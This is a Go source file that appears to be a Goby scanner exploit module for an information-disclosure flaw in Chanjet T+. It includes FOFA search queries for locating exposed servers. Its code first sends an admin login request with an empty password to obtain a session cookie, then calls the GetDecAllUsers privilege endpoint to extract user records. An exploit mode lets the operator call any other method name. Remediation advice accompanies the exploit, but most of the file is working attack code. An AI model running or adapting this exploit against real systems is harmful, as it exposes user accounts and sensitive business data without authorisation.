package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "t+cloud chanjet /getdecallusers Information Disclosure Vulnerability",
    "Description": "<p>t+cloud chanjet getdecallusers Information Disclosure，The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "t.chanjet",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2024-07-22",
    "PostTime": "2024-07-23",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\" && body=\"login\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\" && body=\"login\"",
    "Level": "1",
    "Impact": "<p>t+cloud chanjet getdecallusers Information Disclosure，The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>Restrict Access Permissions: Modify the interface's permission settings to ensure that only authenticated and authorized users can access interfaces containing sensitive information.Data Encryption: Encrypt sensitive information both in transit and at rest within the interface using strong encryption algorithms such as AES to protect data security.Implement Logging and Auditing: Establish comprehensive logging and auditing mechanisms to monitor interface access, promptly detect abnormal activities, and mitigate potential security threats.</p>",
    "References": [
        "https://blog.csdn.net/nglj9527/article/details/139302990"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "GetDecAllUsers",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.9",
    "Translation": {
        "CN": {
            "Name": "用友 畅捷通T+ /getdecallusers 信息泄露漏洞",
            "Product": "畅捷通T+",
            "Description": "<p>用友 畅捷通T+ getdecallusers 存在信息泄露漏洞，可获取系统用户个人信息。<br></p>",
            "Recommendation": "<p>限制访问权限：修改接口权限设置，确保只有经过身份验证且授权的用户才能访问含有敏感信息的接口。数据加密：对于传输和存储在接口中的敏感信息，使用强加密算法（如AES）进行加密处理，以保护数据安全。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br>造成网站大部分敏感数据泄露!</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "t+cloud chanjet /getdecallusers Information Disclosure Vulnerability",
            "Product": "t.chanjet",
            "Description": "<p>t+cloud chanjet getdecallusers Information Disclosure，The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>Restrict Access Permissions: Modify the interface's permission settings to ensure that only authenticated and authorized users can access interfaces containing sensitive information.Data Encryption: Encrypt sensitive information both in transit and at rest within the interface using strong encryption algorithms such as AES to protect data security.Implement Logging and Auditing: Establish comprehensive logging and auditing mechanisms to monitor interface access, promptly detect abnormal activities, and mitigate potential security threats.<br></p>",
            "Impact": "<p>t+cloud chanjet getdecallusers Information Disclosure，The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//post请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlPost)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		//两次post,第一次拿到Cookie
		//第二次读文件
		path1 := "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		body1 := `{"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023", "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid": "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "", "fromWhere": "browser", "cardNo": ""}`
		getCookie, err := setPostRequest(hostInfo, path1, body1, header)
		if err != nil || getCookie.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(getCookie.Cookie, "ASP.NET_SessionId") {
			return "", err
		}
		// --------------------------------------------
		path2 := "/tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method=" + fileUrl
		body2 := `{"condition": "", "accNum": "", "onlyBuying": "false"}`
		header2 := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Cookie":          getCookie.Cookie,
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		resp, err := setPostRequest(hostInfo, path2, body2, header2)

		if err != nil || resp == nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "UserName") {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method="

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"GetDecAllUsers": "UserId",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true
			expResult.Output = resp
			return expResult

		},
	))
}


